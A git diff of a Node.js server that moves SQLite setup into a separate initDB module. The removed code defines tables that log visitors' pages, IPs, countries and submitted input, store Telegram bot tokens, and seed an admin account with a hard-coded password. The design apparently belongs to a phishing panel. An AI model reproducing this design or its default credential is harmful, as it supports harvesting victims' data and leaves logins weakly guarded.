@@ -3,6 +3,7 @@ import http from "http";
 import { Server } from "socket.io";
 import sqlite3 from "sqlite3";
 import { open } from "sqlite";
+import { initDB } from "./db.js";
 import path from "path";
 import { fileURLToPath } from "url";
 import createRoutes from "./routes/routes.js";
@@ -54,70 +55,8 @@ app.use(
 app.use('/.well-known/acme-challenge', express.static(path.join(__dirname, '.well-known', 'acme-challenge')));
 app.use("/", capRouter);
 
-// ✅ SQLite setup (wait before mounting routes)
-let db;
-(async () => {
-  db = await open({
-    filename: "./database.db",
-    driver: sqlite3.Database,
-  });
 
-  await db.exec(`
-    CREATE TABLE IF NOT EXISTS users (
-      id TEXT PRIMARY KEY,
-      status TEXT,
-      last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
-      page TEXT,
-      ip TEXT,
-      country TEXT,
-      input_data TEXT,
-      identifier TEXT
-    )
-  `);
-
-  await db.exec(`
-    CREATE TABLE IF NOT EXISTS results (
-      user_id TEXT UNIQUE,
-      message TEXT,
-      user_info TEXT,
-      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-      FOREIGN KEY (user_id) REFERENCES users(id)
-    )
-  `);
-  
-
-  await db.exec(`
-  CREATE TABLE IF NOT EXISTS admin_settings (
-  id INTEGER PRIMARY KEY AUTOINCREMENT,
-  autopilot INTEGER DEFAULT 0 CHECK (autopilot IN (0,1)),
-  userDisp TEXT,
-  BotToken TEXT,
-  ChatID TEXT,
-  TelegramEnabled INTEGER DEFAULT 0 CHECK (TelegramEnabled IN (0,1)),
-  baSUB INTEGER DEFAULT 0 CHECK (baSUB IN (0,1))
-);
-
-CREATE TABLE IF NOT EXISTS admins (
-  id INTEGER PRIMARY KEY AUTOINCREMENT,
-  username TEXT UNIQUE NOT NULL,
-  password_hash TEXT NOT NULL,
-  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-);
-`);  
-
-	await db.exec(`
-	  INSERT INTO admin_settings (id, autopilot, userDisp, BotToken, ChatID, TelegramEnabled, baSUB)
-	  SELECT 1, 0, '', '', '', 0, 0
-	  WHERE NOT EXISTS (SELECT 1 FROM admin_settings);
-	`);
-	
-	const hash = await bcrypt.hash("UpdateTeam12", 12);
-
-await db.run(
-  "INSERT INTO admins (username, password_hash) VALUES (?, ?)",
-  ["admin", hash]
-);
-
+  const db = await initDB();
   // ✅ Now mount app routes AFTER session is active
   app.use(blockedRedirect(db)); 
   app.use("/", createRoutes(db, io));
@@ -126,10 +65,6 @@ await db.run(
   app.use('/', createBotRouter(db, io));
 
   console.log("✅ Routes and botRouter loaded.");
-})().catch(err => {
-  console.error("Fatal DB setup error:", err);
-  process.exit(1);
-});
 
   
 // ----------------------
